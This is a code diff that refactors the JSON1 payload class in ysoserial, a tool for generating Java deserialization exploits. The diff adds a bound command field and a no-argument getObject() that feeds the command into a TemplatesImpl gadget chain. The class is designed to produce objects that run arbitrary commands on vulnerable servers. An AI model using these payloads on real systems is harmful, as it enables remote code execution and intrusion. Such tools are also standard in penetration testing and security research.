@@ -1,6 +1,8 @@
 package ysoserial.payloads;
 
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -17,11 +19,12 @@ import javax.management.openmbean.OpenDataException;
 import javax.management.openmbean.OpenType;
 import javax.management.openmbean.TabularDataSupport;
 import javax.management.openmbean.TabularType;
-
 import javax.xml.transform.Templates;
 
 import org.springframework.aop.framework.AdvisedSupport;
+
 import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
+
 import net.sf.json.JSONObject;
 
 
@@ -67,7 +70,17 @@ import net.sf.json.JSONObject;
 } )
 public class JSON1 implements ObjectPayload<Object> {
 
-    public Map getObject ( String command ) throws Exception {
+	@Bind private String command;
+	
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Map getObject ( String command ) throws Exception {
+		return getObject();
+	}
+
+
+	public Map getObject ( ) throws Exception {
         return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
     }
 
